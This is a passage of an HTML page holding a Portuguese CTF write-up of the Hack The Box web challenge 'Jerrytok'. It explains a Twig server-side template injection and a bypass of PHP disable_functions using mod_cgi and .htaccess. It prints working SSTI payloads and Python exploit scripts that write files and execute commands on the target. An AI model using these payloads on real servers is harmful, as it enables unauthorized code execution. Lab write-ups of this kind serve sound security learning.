@@ -1,0 +1,829 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr"
+    data-theme="dark"
+    data-layout="centered">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+  <meta name="generator" content="Hugo 0.168.0">
+  <meta name="generator-theme" content="Book Theme: https://github.com/alex-shpak/hugo-book">
+
+
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="obs: Em algumas evidências o IP fica diferente, pois a instância tem limite para ficar online e preciso iniciar outra">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark">
+<meta name="format-detection" content="telephone=no"><meta property="og:url" content="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/jerrytok/">
+	<meta property="og:site_name" content="Portas">
+	<meta property="og:title" content="Portas">
+	<meta property="og:description" content="obs: Em algumas evidências o IP fica diferente, pois a instância tem limite para ficar online e preciso iniciar outra">
+	<meta property="og:locale" content="en_us">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+
+
+	<meta itemprop="name" content="Portas">
+	<meta itemprop="description" content="obs: Em algumas evidências o IP fica diferente, pois a instância tem limite para ficar online e preciso iniciar outra">
+	<meta itemprop="wordCount" content="1613">
+
+<title>Jerrytok • Portas</title>
+<link rel="icon" href="/favicon.svg" type="image/svg+xml">
+<link rel="icon" href="/favicon.png" sizes="any">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/ctf/hack-the-box/challenges-web/jerrytok/">
+<link rel="stylesheet" href="/book.min.d2a63061af208ea46d4a5088bdb2c8d297df14bbb9064b630ae0b63dcb664760.css" integrity="sha256-0qYwYa8gjqRtSlCIvbLI0pffFLu5BktjCuC2PctmR2A=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.5d7d2e44f776c41b94da5c54f7df9ffe0ff698ce88fe3f1b3bd9e7b1f82ccae2.js" integrity="sha256-XX0uRPd2xBuU2lxU99&#43;f/g/2mM6I/j8bO9nnsfgsyuI=" crossorigin="anonymous"></script>
+  
+</head>
+
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <div class="book-container flex">
+    
+<aside class="book-menu" aria-label="Menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" role="searchbox" enterkeyhint="search"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results" aria-live="polite"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+
+
+
+
+
+
+
+  
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-fd1b80fe704649033173072830dbda4c" class="toggle"  />
+    <label for="section-fd1b80fe704649033173072830dbda4c" class="flex">
+      <a role="button" class="">
+        Offensive Security</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b78b49e6983b03c601585815216f03c4" class="toggle"  />
+    <label for="section-b78b49e6983b03c601585815216f03c4" class="flex">
+      <a role="button" class="">
+        Initial Access</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/offsensive-security/inital-access/remote-template-injection/" class="">
+      Remote Template Injection</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-6652e0280f4a0b30fa40b02437030f68" class="toggle" checked />
+    <label for="section-6652e0280f4a0b30fa40b02437030f68" class="flex">
+      <a role="button" class="">
+        CTF</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-58e18b116dcb674821e213ec0945416f" class="toggle" checked />
+    <label for="section-58e18b116dcb674821e213ec0945416f" class="flex">
+      <a role="button" class="">
+        Hack the Box</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-494dc92d9104717a20a45ff4de94fed4" class="toggle" checked />
+    <label for="section-494dc92d9104717a20a45ff4de94fed4" class="flex">
+      <a role="button" class="">
+        Challenges (web)</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/breaking-grad/" class="">
+      Breaking Grad</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/jerrytok/" class="active">
+      Jerrytok</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/templated/" class="">
+      Templated</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/challenges-web/toxic/" class="">
+      Toxic</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-b358f1a871f27b6123c59716f1b3428c" class="toggle"  />
+    <label for="section-b358f1a871f27b6123c59716f1b3428c" class="flex">
+      <a role="button" class="">
+        Machines</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/blurry/" class="">
+      Blurry</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/certified/" class="">
+      Certified</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/cicada/" class="">
+      Cicada</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/hack-the-box/machines/monitorsthree/" class="">
+      Monitorsthree</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-c7059daadfdbaf53fa1366c3499caad7" class="toggle"  />
+    <label for="section-c7059daadfdbaf53fa1366c3499caad7" class="flex">
+      <a role="button" class="">
+        Juice Shop</a>
+      <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#chevron-right"></use></svg>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/cross-site-scriping/" class="">
+      Cross Site Scriping</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/injection/" class="">
+      Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/ctf/juice-shop/readme/" class="">
+      Readme</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <header class="book-header hidden">
+      
+  <div class="flex align-center justify-between gap">
+  <input type="checkbox" class="toggle" id="menu-control" />
+  <label for="menu-control" aria-label="Menu">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#menu"></use></svg>
+  </label>
+
+  <div class="book-brand">
+  <a class="flex align-center" href="/"><span>Portas</span>
+  </a>
+</div>
+
+
+  
+  <input type="checkbox" class="toggle" id="toc-control" />
+  <label for="toc-control" aria-label="Table of Contents">
+    <svg class="book-icon"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#toc"></use></svg>
+  </label>
+  
+</div>
+
+ 
+    </header>
+
+    <main class="book-page">
+      
+      
+  
+
+      
+  <article class="markdown book-article"><h1 id="jerrytok">Jerrytok<a class="anchor" href="#jerrytok" aria-label="Link"></a></h1>
+<p>Jerrytok é um desafio médio do hack the box da categoria web.</p>
+<p>O desafio disponibiliza o código-fonte e um ambiente Docker para subir a aplicação, permitindo que eu inicie os testes em um ambiente local.</p>
+<h2 id="recon">Recon<a class="anchor" href="#recon" aria-label="Link"></a></h2>
+<p>Começo explorando a aplicação interagindo com a interface e analisando suas funcionalidades. Em seguida, examino o código-fonte para entender melhor sua implementação.</p>
+<p>A primeira coisa que faço é subir a aplicação através do container docker para poder interagir com ela no navegador:<br></p>
+<figure><img src="/assets/image.png">
+</figure>
+
+<p>A aplicação está disponível em <code>localhost:1337</code>, permitindo que eu a analise diretamente no navegador.</p>
+<figure><img src="/assets/image%20%281%29.png">
+</figure>
+
+<p>É uma página aparentemente estática, não existe nenhuma funcionalidade na interface que podemos interagir, então vou olhar o código fonte para ver se existe algo interessante nessa aplicação.</p>
+<p>Trata-se de uma aplicação PHP baseada no framework Symfony. Ao verificar o arquivo de rotas, vejo que há apenas uma rota definida, direcionando para <code>DefaultController::index()</code>.</p>
+<figure><img src="/assets/image%20%283%29.png">
+</figure>
+
+<p>Lendo a função dessa <code>controller</code> que processa nossa requisição HTTP, podemos notar algo interessante, essa rota aceita uma <code>query string</code> chamada <code>location</code>, em seguida a aplicação gera uma <code>template string</code> com esse parâmetro, dessa forma podemos controlar a template string que depois será renderizada como um template <code>twig</code>, assim temos uma vulnerabilidade de <code>SSTI</code> nesse sistema:</p>
+<figure><img src="/assets/image%20%284%29.png">
+</figure>
+
+<h2 id="exploração">Exploração<a class="anchor" href="#explora%c3%a7%c3%a3o" aria-label="Link"></a></h2>
+<p>Para confirmar a vulnerabilidade SSTI, envio um teste padrão <code>{{7*7}}</code> na query string e verifico a resposta.</p>
+<figure><img src="/assets/image%20%286%29.png">
+</figure>
+
+<p>Com isso temos a confirmação do <code>SSTI</code> que podemos abusar. Para ler a flag precisamos explorar esse <code>SSTI</code> para conseguir um <code>RCE</code> e executar um programa <code>readflag</code> (um file_get_contents não funcionaria, pois a flag está no diretório root onde o PHP não tem acesso) como objetivo do desafio:</p>
+<figure><img src="/assets/image%20%288%29.png">
+</figure>
+
+<figure><img src="/assets/image%20%289%29.png">
+</figure>
+
+<p>Com isso, basta usar o SSTI para executar um comando no SO que execute o programa readflag, usando a payload <code>{{['/readflag']|filter('system')}}</code>:</p>
+<figure><img src="/assets/image%20%2810%29.png">
+</figure>
+
+<p>Porém, ao executar essa payload no ambiente de produção, ela não funciona:</p>
+<figure><img src="/assets/image%20%2811%29.png">
+</figure>
+
+<h3 id="funções-não-desabilitadas">Funções não desabilitadas<a class="anchor" href="#fun%c3%a7%c3%b5es-n%c3%a3o-desabilitadas" aria-label="Link"></a></h3>
+<p>Estudando mais o código fonte, vejo que o motivo está nas configurações de <code>disable funcions</code> do PHP, que não permite que eu execute a função <code>system</code> e várias outras:</p>
+<figure><img src="/assets/image%20%2812%29.png">
+</figure>
+
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create, mail&#34;</span> &gt;&gt; /etc/php82/conf.d/disablefns.ini</span></span></code></pre></div><p>Agora, minha intenção é encontrar formas de contornar o <code>disable_functions</code>. A primeira abordagem que considero é identificar alguma função ainda disponível que permita a execução de comandos no sistema operacional, porém não consegui achar funções perigosas fora dessa lista.</p>
+<p>{% hint style=&ldquo;info&rdquo; %}
+Obs: Depois de resolver o desafio, ao ler outras writeups,  descobri o que a função <code>imap</code> pode ser explorada para conseguir um RCE.
+{% endhint %}</p>
+<h3 id="ld_preload">LD_Preload<a class="anchor" href="#ld_preload" aria-label="Link"></a></h3>
+<p>Pesquisando mais, encontro uma técnica para obter RCE via <code>LD_PRELOAD</code> no Linux. No entanto, ela requer a função <code>putenv</code>, que está bloqueada. Apesar disso, considero essa abordagem útil para testes futuros.: <a href="https://blog.ironlinux.com.br/bypass-do-disable-functions-do-php-utilizando-ld_preload/">https://blog.ironlinux.com.br/bypass-do-disable-functions-do-php-utilizando-ld_preload/</a>.</p>
+<h3 id="overwrite-disable_functions">Overwrite disable_functions<a class="anchor" href="#overwrite-disable_functions" aria-label="Link"></a></h3>
+<h4 id="php-info">PHP INFO<a class="anchor" href="#php-info" aria-label="Link"></a></h4>
+<p>Com o SSTI em mãos, eu consigo executar qualquer função bloqueada do PHP, o que expande minhas possibilidades, então eu invisto um tempo craftando uma payload onde eu consiga executar qualquer função independente do número de parâmetros que ela precise, depois de certo tempo de estudo e pesquisa consigo usar a função <code>call_user_func_array</code> para buildar uma função com seus parâmetros para mim, a payload final fica com esse padrão: <code>{{[‘function_name’, [‘param1’, ‘param2’, ...]]|sort(‘call_user_func_array’)|join}}</code>. Dessa forma agora, eu tenho controle sobre qualquer função do PHP e muito mais possibilidades para explorar esse ambiente. </p>
+<p>Para confirmar o funcionamento e ter uma discrição melhor do ambiente, escrevo um arquivo com <code>phpinfo();</code> que vai me dizer as configurações do ambiente utilizando essa payload: <code>{{ ['file_put_contents', ['/www/public/info2.php', '']] | sort('call_user_func_array') | join }}</code></p>
+<figure><img src="/assets/image%20%2813%29.png">
+</figure>
+
+<p>Isso me da uma visão muito mais privilegiada da configuração do ambiente, e consigo observar as mudanças causadas pelas minhas tentativas de modificar os arquivos de configuração com <code>file_put_contents</code>. </p>
+<h4 id="userini">.user.ini<a class="anchor" href="#userini" aria-label="Link"></a></h4>
+<p>Além de <code>disable_functions</code>, a configuração <code>open_basedir</code> está definida para <code>/www</code>, restringindo o acesso do PHP a arquivos dentro desse diretório, tanto para leitura quanto para escrita.</p>
+<p>Fazendo algumas pesquisar conheci o arquivo <code>.user.ini</code> do PHP que permite setar algumas configurações do PHP, com isso duas possibilidades aparecem em mente:</p>
+<ul>
+<li>Sobrescrever a configuração de disable_functions;</li>
+<li>Sobrescrever a configuração de open_basedir, e alterar as configurações do php.ini no diretório <code>/etc;</code> </li>
+</ul>
+<p>A primeira opção parece mais direto ao ponto, então vamos testar primeiro.</p>
+<p>Uso a payload <code>{{ ['file_put_contents', ['/www/public/.user.ini', 'disable_functions = &quot;shell_exec&quot;']] | sort('call_user_func_array') | join }}</code> que irá escrever no <code>.user.ini</code> (e criar o arquivo se não existir) que a única função desabilitada é o <code>shell_exec</code>, e irá liberar todas as outras. </p>
+<figure><img src="/assets/image%20%2814%29.png">
+</figure>
+
+<p>Agora, olhando no arquivo info.php que criamos anteriormente, podemos conferir se conseguimos modificar a configuração, e concluímos que não, as funções continuam bloqueadas:</p>
+<figure><img src="/assets/image%20%2815%29.png">
+</figure>
+
+<p>O <code>.user.ini</code> não pode alterar <code>disable_functions</code> nem <code>open_basedir</code>, descartando essa abordagem.</p>
+<h4 id="htaccess">Htaccess<a class="anchor" href="#htaccess" aria-label="Link"></a></h4>
+<p>Seguindo essa mesma linha, existe um outro arquivo que pode alterar as configurações do PHP em que podemos tentar abusar, que é o arquivo <code>.htaccess</code>.</p>
+<p>No ambiente, o servidor Apache recebe as requisições e, seguindo regras específicas (algumas definidas no <code>.htaccess</code>), direciona a execução para os arquivos PHP. Isso permite que o <code>.htaccess</code> modifique alguns comportamentos do PHP.</p>
+<p>Vou tentar a mesma estratégia anterior de sobrescrever algumas diretivas de configuração, porém através do <code>.HTACESS</code>. </p>
+<p>Faço o teste no container local, porém obtenho um erro: </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>Mon Mar <span style="color:#ae81ff">03</span> 20:26:13.050064 2025<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>core:alert<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>pid 97:tid 109<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>client 172.17.0.1:56906<span style="color:#f92672">]</span> /www/public/.htaccess: Invalid command <span style="color:#e6db74">&#39;php_value&#39;</span>, perhaps misspelled or defined by a module not included in the server configuration, referer: http://localhost:1337/info.php</span></span></code></pre></div><p>O <code>.htaccess</code> não pode alterar o valor de <code>disable_functions</code>, essa ideia também não irá funcionar.</p>
+<h3 id="mod-cgi">Mod CGI<a class="anchor" href="#mod-cgi" aria-label="Link"></a></h3>
+<p>Até então as ideias não funcionaram, mas os testes nos deram evidências importantes para o nosso contexto atual:</p>
+<ul>
+<li>Apesar do <code>disable_functions</code>, podemos controlar diversas funções do PHP e conseguir um <code>Arbitrary Read/Write</code> dentro do diretório <code>/www</code>;</li>
+<li>O ambiente é controlado por um servidor Apache que controla as chamadas para o PHP;</li>
+<li>Podemos escrever arquivos dentro de <code>/www</code> que sejam interpretados pelo Apache.</li>
+</ul>
+<p>Indo na mesma linha do <code>.htaccess</code>, podemos criar uma configuração com o apache para executar scripts diretamente como CGI baseado nessa pesquisa: <a href="https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi">https://hacktricks.boitatech.com.br/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-mod_cgi</a></p>
+<p>Em resumo, vamos criar um script com uma extensão qualquer (.dizzle) que em seu conteúdo tenham instruções (um shell script) para serem executadas. Em seguida, vamos configurar o apache para interpretar arquivos .dizzle como um arquivo a ser processado diretamente pelo CGI, sem ser executado pelo PHP e todas as suas restrições nesse ambiente. No final, criaremos um HTML qualquer que chamará pelo nosso arquivo.dizzle, e no momento que o browser fizer a requisição para esse arquivo para o apache, ele será executado e nosso RCE deverá funcionar.</p>
+<p>Primeiro, crio o script que o CGI deverá executar, para o desafio, preciso executar o o comando <code>readflag</code> e ler o output, farei com esse script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#sh pois o sistema não tem o bash instalado</span>
+</span></span><span style="display:flex;"><span>echo -ne <span style="color:#e6db74">&#34;Content-Type: text/html\n\n&#34;</span>; <span style="color:#75715e"># header necessário para o apache</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/readflag</span></span></code></pre></div><p>Uso esse script python para realizar a request e cuidar dos encodings para mim:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash_script <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">echo -ne &#39;Content-Type: text/html</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">n</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">n&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/readflag
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>twig_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;[&#34;file_put_contents&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;[&#34;/www/public/cmd.dizzle&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#e6db74">{</span>bash_script<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;]&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;]|sort(&#34;call_user_func_array&#34;)|join&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;}}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded_payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(twig_payload)
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://localhost:1337/?location=</span><span style="color:#e6db74">{</span>encoded_payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div><p>Executando o script no ambiente local e conferindo dentro do container, podemos ver que o arquivo foi escrito:</p>
+<figure><img src="/assets/image%20%2819%29.png">
+</figure>
+
+<p>Agora precisamos escrever a regra para o apache tratar o arquivo <code>cmd.dizzle</code> como um arquivo para ser interpretado pelo CGI. Uso esse conteúdo para o .htaccess:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-apacheconf" data-lang="apacheconf"><span style="display:flex;"><span>Options +ExecCGI
+</span></span><span style="display:flex;"><span>AddHandler cgi-script .dizzle</span></span></code></pre></div><p>Novamente uso um script para lidar com todo o encoding:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bash_script <span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Options +ExecCGI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AddHandler cgi-script .dizzle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>twig_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;[&#34;file_put_contents&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;[&#34;/www/public/.htaccess&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#e6db74">{</span>bash_script<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;]&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;]|sort(&#34;call_user_func_array&#34;)|join&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;}}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>encoded_payload <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>parse<span style="color:#f92672">.</span>quote(twig_payload)
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://localhost:1337/?location=</span><span style="color:#e6db74">{</span>encoded_payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Status: </span><span style="color:#e6db74">{</span>response<span style="color:#f92672">.</span>status_code<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div><figure><img src="/assets/image%20%2820%29.png">
+</figure>
+
+<p>Temos o cmd.dizzle no servidor e o .htaccess configurado para executá-lo, porém se tentarmos, teremos um erro de permissão:</p>
+<figure><img src="/assets/image%20%2817%29.png">
+</figure>
+
+<p>Então vamos configurar a permissão para 777 com a payload  <code>{{ ['chmod', ['/www/public/cmd.dizzle', '511']] | sort('call_user_func_array') | join }}</code> </p>
+<p>E agora, acessando a rota /cmd.dizzle, tenho a flag:</p>
+<figure><img src="/assets/image%20%2818%29.png">
+</figure>
+
+<p>Com o exploit funcional, executo-o no servidor de produção para capturar a flag real.</p>
+<p>Para isso, crio um script que executa o exploit que criamos agora de forma automática.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib.parse
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write_htaccess</span>() <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    htaccess <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;Options +ExecCGI
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">AddHandler cgi-script .dizzle
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    twig_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{{&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;[&#34;file_put_contents&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;[&#34;/www/public/.htaccess&#34;, &#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;&#34;</span><span style="color:#e6db74">{</span>htaccess<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;]&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;]|sort(&#34;call_user_func_array&#34;)|join&#39;</span> <span style="color:#f92672">+</span> \
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;}}&#39;</span>
